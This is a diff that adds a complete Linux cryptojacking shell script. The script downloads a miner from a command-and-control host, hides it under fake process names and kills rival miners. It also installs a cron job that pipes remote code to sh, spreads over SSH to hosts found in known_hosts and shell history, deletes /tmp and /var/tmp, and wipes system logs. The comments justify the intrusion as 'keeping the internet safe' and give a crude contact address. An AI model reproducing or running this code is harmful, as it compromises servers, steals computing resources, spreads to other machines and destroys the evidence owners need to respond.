@@ -1,0 +1,206 @@
+#!/bin/sh
+
+#Goal:
+# The goal of this campaign is as follows;
+#       - To keep the internet safe.
+#       - To keep them hackers from causing real damage to organizations.
+#       - We know you feel We are a potential threat, well We ain't.
+#       - We want to show how tiny vulns could lead to total disasters.
+#       - We know you feel We are Hypocrite's, because we mine. Well if we don't how the hell we gonna let you know we are in.
+#       - Please We plead to every one out there don't sabotage this campaign (We want to keep the internet safe).
+#       - Sometimes you gotta break the rules to make them.
+#
+#Disclaimer:
+#1) We only Wanna Mine.
+#2) We don't want your data, or anything or even a ransom.
+#3) Please if you find this code, don't post about it.
+#4) We make your security better by breaking it.
+#
+#Contact:
+#1) If your server gets infected:
+#       - We will provide cleanup script.
+#       - We will share source of entry into your servers and patch (surely).
+#       - Please if you contacting, please send your affected server's ip and services your run on the server.
+#       - lets talk via email at: internetrapist@rape.lol
+#2) If you want to partner with us ?.
+#       - Shoot us an email ;).
+
+URL=http://p.6465737472756374696f6e.icu:8080/p
+INSTALL_DIR=/var/tmp/.systemd-private-c15c0d5284bd838c15fd0d6c5c2b50bb-systemd-resolved.service-xCkB12/vje9c1vlq/bk20vm2o/pavmofp3
+MINER_PID_FILE="$INSTALL_DIR/mpid"
+GUARD_FILE="$INSTALL_DIR/spid"
+PROC_HANDLER_PID_FILE="$INSTALL_DIR/ppid"
+MD5_PROC=2b51d09d8eafb765606ced3b43453c9b
+MD5_MINER=ae0f778496c2f1056da3437c7dd2e853
+MINER_NAME=bioset
+PROC_HANDLER_NAME=proc_1
+check_arg=$1
+
+bot_kill() {
+    ps aux | grep -i "systemd-0" | awk '{print $2}' | xargs  kill -9
+    ps aux | grep -i "vmstat1" | awk '{print $2}' | xargs  kill -9
+    ps aux | grep -i "vmstat0" | awk '{print $2}' | xargs  kill -9
+    ps aux | grep -i "jenkins-0" | awk '{print $2}' | xargs  kill -9
+    ps aux | grep -i "rpciod0" | awk '{print $2}' | xargs  kill -9
+    ps aux | grep -i "kjournald" | awk '{print $2}' | xargs  kill -9
+    ps aux | grep -i "flush-199" | awk '{print $2}' | xargs  kill -9
+    ps aux | grep -i "kblockd0" | awk '{print $2}' | xargs  kill -9
+    ps aux | grep -i "hwlh3wlh44lh" | awk '{print $2}' | xargs  kill -9
+    ps aux | grep -i "Circle_MI" | awk '{print $2}' | xargs  kill -9
+    ps aux | grep -i "get.bi-chi.com" | awk '{print $2}' | xargs  kill -9
+    ps aux | grep -i "hashvault.pro" | awk '{print $2}' | xargs  kill -9
+    ps aux | grep -i "nanopool.org" | awk '{print $2}' | xargs  kill -9
+    ps aux | grep -i "bioset-199" | awk '{print $2}' | xargs  kill -9
+    ps aux | grep -i "kauditd0" | awk '{print $2}' | xargs  kill -9
+    ps aux | grep -i "/usr/bin/.sshd" | awk '{print $2}' | xargs  kill -9
+    ps aux | grep -i "/usr/bin/bsd-port" | awk '{print $2}' | xargs  kill -9
+    ps aux | grep -i "xmr" | awk '{print $2}' | xargs  kill -9
+    ps aux | grep -i "xig" | awk '{print $2}' | xargs  kill -9
+    ps aux | grep -i "ddgs" | awk '{print $2}' | xargs  kill -9
+    ps aux | grep -i "watchdog_0" | awk '{print $2}' | xargs  kill -9
+    ps aux | grep -e '0-9a-f\{32\}' | awk '{print $2}' | xargs  kill -9
+    ps aux | grep -e '0-9a-f\{33\}' | awk '{print $2}' | xargs  kill -9
+    ps aux | grep -i "tmp00" | awk '{print $2}' | xargs  kill -9
+    ps aux | grep -e '0-9a-f\{16\}' | awk '{print $2}' | xargs  kill -9
+    ps aux | grep -i "khugepaged" | awk '{print $2}' | xargs  kill -9
+    ps aux | grep -i "qW3xT" | awk '{print $2}' | xargs  kill -9
+    ps aux | grep -i "wnTKYg" | awk '{print $2}' | xargs  kill -9
+    ps aux | grep -i "t00ls.ru" | awk '{print $2}' | xargs  kill -9
+    ps aux | grep -i "sustes" | awk '{print $2}' | xargs  kill -9
+    ps aux | grep -i "thisxxs" | awk '{print $2}' | xargs  kill -9
+    netstat -antp | grep ":14444" | awk '{print $7}' | cut -d "/" -f 1 | xargs kill -9
+    netstat -antp | grep ":3333" | awk '{print $7}' | cut -d "/" -f 1 | xargs kill -9
+    netstat -antp | grep ":4444" | awk '{print $7}' | cut -d "/" -f 1 | xargs kill -9
+    netstat -antp | grep ":5555" | awk '{print $7}' | cut -d "/" -f 1 | xargs kill -9
+    netstat -antp | grep ":7777" | awk '{print $7}' | cut -d "/" -f 1 | xargs kill -9
+    ps aux | grep -i "hashfish" | awk '{print $2}' | xargs  kill -9
+    ps aux | grep -i -w "./kworker" | awk '{print $2}' | xargs  kill -9
+    ps aux | grep -i "kworkerds" | awk '{print $2}' | xargs  kill -9
+    ps aux | grep -i "/tmp/devtool" | awk '{print $2}' | xargs  kill -9
+    ps aux | grep -i "systemctI" | awk '{print $2}' | xargs  kill -9
+    ps aux | grep -i "sustse" | awk '{print $2}' | xargs  kill -9
+    ps aux | grep -i "axgt" | awk '{print $2}' | xargs  kill -9
+    ps aux | grep -i "sustse" | awk '{print $2}' | xargs  kill -9
+    ps aux | grep -i "6Tx3Wq" | awk '{print $2}' | xargs  kill -9
+    ps aux | grep -i "dblaunchs" | awk '{print $2}' | xargs  kill -9
+    ps aux | grep -i "migrations" | awk '{print $2}' | xargs  kill -9
+    ps aux | grep -i "kerberods" | awk '{print $2}' | xargs  kill -9
+    ps aux | grep -i "httpdz" | awk '{print $2}' | xargs  kill -9
+    ps aux | grep -i "qgcd" | awk '{print $2}' | xargs  kill -9
+    kill -9 "$(cat /tmp/.X11unix)"
+    kill -9 "$(cat /tmp/.XImunix)"
+    kill -9 "$(cat /tmp/.lsdpid)"
+    # pkill -f "/bin/bash"
+    # ps aux|grep -v grep|grep -v "/bin/sh"|grep -v "bash"|awk '{if($3>=50.0) print $2}'|xargs kill -9
+}
+
+bash_fake_name() {
+    nohup bash -c "( exec -a '/bin/bash' /bin/bash ) < $1" >/dev/null 2>&1 &
+    sleep 1s
+    pkill -f "$PROC_HANDLER_NAME"
+    sleep 3s
+}
+
+exe_fake_name() {
+    nohup bash -c "exec -a '/sbin/init' $1" >/dev/null 2>&1 & echo $! > $MINER_PID_FILE
+}
+
+run_procs() {
+    if [ -w "$INSTALL_DIR" ];
+    then
+        chmod +x $INSTALL_DIR/$MINER_NAME
+        chmod +x $INSTALL_DIR/$PROC_HANDLER_NAME
+        if ! kill -0 "$(cat $MINER_PID_FILE)" > /dev/null
+        then
+            exe_fake_name "./$MINER_NAME"
+        fi
+        if ! kill -0 "$(cat $PROC_HANDLER_PID_FILE)" > /dev/null
+        then
+            if test "$check_arg" != "t"
+            then
+                bash_fake_name "./$PROC_HANDLER_NAME"
+            fi
+        fi
+    else
+        exit 1
+    fi
+}
+
+getmd5() {
+    echo "$(md5sum "$1" | cut -d ' ' -f 1)"
+}
+
+install() {
+    cd $INSTALL_DIR
+    if test "$(getmd5 $MINER_NAME)" != "$MD5_MINER" || test "$(getmd5 $PROC_HANDLER_NAME)" != "$MD5_PROC"
+    then
+        kill -9 "$(cat $PROC_HANDLER_PID_FILE)"
+        kill -9 "$(cat $MINER_PID_FILE)"
+        rm -rf /var/tmp
+        rm -rf /tmp
+        mkdir -p /tmp
+        mkdir -p /var/tmp
+        chmod 1777 /var/tmp
+        chmod 1777 /tmp
+        mkdir -p $INSTALL_DIR
+        cd $INSTALL_DIR
+        sleep 15s
+        mkdir -p $INSTALL_DIR
+        cd $INSTALL_DIR
+        ARCH=$(getconf LONG_BIT)
+        if test "$(getmd5 $PROC_HANDLER_NAME)" != "$MD5_PROC"
+        then
+            (curl -fsSL -m180 "$URL?a=h" -o "$PROC_HANDLER_NAME"||wget -T180 -q "$URL?a=h" -O "$PROC_HANDLER_NAME")
+        fi
+        if test "$(getmd5 $MINER_NAME)" != "$MD5_MINER"
+        then
+            if test "${ARCH}x" = "64x"
+            then
+                (curl -fsSL -m180 "$URL?a=d&ar=64" -o "$MINER_NAME"||wget -T180 -q "$URL?a=d&ar=64" -O "$MINER_NAME")
+            else
+                (curl -fsSL -m180 "$URL?a=d&ar=86" -o "$MINER_NAME"||wget -T180 -q "$URL?a=d&ar=86" -O "$MINER_NAME")
+            fi
+        fi
+    fi
+    run_procs
+}
+
+write_cron() {
+    crontab -r
+    echo "*/10 * * * * (curl -fsSL -m180 \"$URL?a=p&a2=cron\"||wget -q -T180 -O- \"$URL?a=p&a2=cron\")|sh"|crontab -
+}
+
+poll() {
+    (curl -fsSL -m180 "$URL?a=p"||wget -q -T180 -O- "$URL?a=p")|sh
+}
+
+lateral() {
+    for h in $(cat /root/.ssh/known_hosts /home/*/.ssh/known_hosts /root/.bash_history /home/*/.bash_history|grep -v "127.0.0.1"|grep -oE "\b(0-9{1,3}\.){3}0-9{1,3}\b"|sort|uniq); do ssh -oBatchMode=yes -oConnectTimeout=5 -oStrictHostKeyChecking=no "$h" '(curl -fsSL -m180 \"$URL?a=p&a2=lat\"||wget -q -T180 -O- \"$URL?a=p&a2=lat\")|sh >/dev/null 2>&1' & done
+}
+
+log_clear() {
+    echo 0>/var/spool/mail/root
+    echo 0>/var/log/wtmp
+    echo 0>/var/log/secure
+    echo 0>/var/log/cron
+    sed -i '/6465737472756374696f6e/d' /var/log/syslog
+}
+
+rm -rf /tmp/cron
+
+if ! kill -0 "$(cat $GUARD_FILE)" > /dev/null
+then
+    echo "$$" > $GUARD_FILE
+    bot_kill
+    write_cron
+    log_clear
+    if ! kill -0 "$(cat $MINER_PID_FILE)" > /dev/null || ! kill -0 "$(cat $PROC_HANDLER_PID_FILE)" > /dev/null
+    then
+        install
+    else
+        poll
+    fi
+    lateral
+    log_clear
+fi
+exit 0
